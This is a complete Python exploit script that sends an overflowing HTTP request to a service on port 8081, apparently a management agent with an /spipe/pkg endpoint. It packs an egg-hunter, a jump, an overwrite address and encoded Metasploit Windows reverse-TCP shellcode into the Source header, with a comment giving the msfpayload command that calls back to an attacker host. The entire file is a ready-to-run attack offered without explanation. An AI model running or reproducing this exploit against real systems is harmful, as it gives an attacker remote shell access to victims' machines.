#!/usr/bin/python
import socket

target_address="192.168.24.157"
target_port=8081
#msfpayload windows/shell/reverse_tcp LHOST=192.168.24.10 LPORT=1237 R | msfencode -b '\x00\x09\x0a\x0b\x0d\x20\x26\x2b\x3d\x25\x8c\x3c\xff'

shellcode = ("\xd9\xf7\xba\xc5\x48\xba\xd2\xd9\x74\x24\xf4\x5d\x31\xc9" +
"\xb1\x49\x31\x55\x19\x83\xc5\x04\x03\x55\x15\x27\xbd\x46" +
"\x3a\x2e\x3e\xb7\xbb\x50\xb6\x52\x8a\x42\xac\x17\xbf\x52" +
"\xa6\x7a\x4c\x19\xea\x6e\xc7\x6f\x23\x80\x60\xc5\x15\xaf" +
"\x71\xe8\x99\x63\xb1\x6b\x66\x7e\xe6\x4b\x57\xb1\xfb\x8a" +
"\x90\xac\xf4\xde\x49\xba\xa7\xce\xfe\xfe\x7b\xef\xd0\x74" +
"\xc3\x97\x55\x4a\xb0\x2d\x57\x9b\x69\x3a\x1f\x03\x01\x64" +
"\x80\x32\xc6\x77\xfc\x7d\x63\x43\x76\x7c\xa5\x9a\x77\x4e" +
"\x89\x70\x46\x7e\x04\x89\x8e\xb9\xf7\xfc\xe4\xb9\x8a\x06" +
"\x3f\xc3\x50\x83\xa2\x63\x12\x33\x07\x95\xf7\xa5\xcc\x99" +
"\xbc\xa2\x8b\xbd\x43\x67\xa0\xba\xc8\x86\x67\x4b\x8a\xac" +
"\xa3\x17\x48\xcd\xf2\xfd\x3f\xf2\xe5\x5a\x9f\x56\x6d\x48" +
"\xf4\xe0\x2c\x05\x39\xde\xce\xd5\x55\x69\xbc\xe7\xfa\xc1" +
"\x2a\x44\x72\xcf\xad\xab\xa9\xb7\x22\x52\x52\xc7\x6b\x91" +
"\x06\x97\x03\x30\x27\x7c\xd4\xbd\xf2\xd2\x84\x11\xad\x92" +
"\x74\xd2\x1d\x7a\x9f\xdd\x42\x9a\xa0\x37\xeb\x30\x5a\xd0" +
"\xd4\x6c\x7c\x2a\xbd\x6e\x7d\x2e\xe8\xe7\x9b\x44\x02\xa1" +
"\x34\xf1\xbb\xe8\xcf\x60\x43\x27\xaa\xa3\xcf\xcb\x4a\x6d" +
"\x38\xa6\x58\x1a\xc8\xfd\x03\x8d\xd7\x28\x29\x32\x42\xd6" +
"\xf8\x65\xfa\xd4\xdd\x42\xa5\x27\x08\xd9\x6c\xbd\xf3\xb6" +
"\x90\x51\xf4\x46\xc7\x3b\xf4\x2e\xbf\x1f\xa7\x4b\xc0\x8a" +
"\xdb\xc7\x55\x34\x8a\xb4\xfe\x5c\x30\xe2\xc9\xc3\xcb\xc1" +
"\xcb\x38\x1a\x2c\x4e\x48\x28\x5c\x92" #exploit
) #exploit


shell  = "\x41" * 100
shell  += "\x60\xc8\x76\x89\x60\xc8\x76\x89" #egg tag
shell  += shellcode
shell  += "\x41" * 120
 

buffer = "GET /spipe/pkg HTTP/1.0\r\n"
buffer += "User-Agent: Mozilla/4.0 (compatible; SPIPE/1.0\r\n"
buffer += "Content-Length: " + str(len(shell)) + "\r\n" # 317+16 bytes shellcode
buffer += "AgentGuid=" + "\x41" * 64 + "\r\n"
buffer += "Source=" + "\x41" * 96 # JUNK

buffer += "\xeb\x1a" #JMP SHORT to egg 
buffer += "\xda\xdb\x1e\x60" #0x601EDBDA
buffer += "\x41" * 14# junk
buffer += "\x41" * 3 + "\xff"
buffer += ("\x66\x81\xca\xff\x0f\x42\x52\x6a\x02"+
"\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8"+
"\x60\xc8\x76\x89" +
"\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7") #egg hunter after \x60\xc8\x76\x89 
buffer += "\r\n\r\n"
buffer += shell

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=sock.connect((target_address,target_port))
sock.send(buffer) 
print(sock.recv(1024))
sock.close()




 









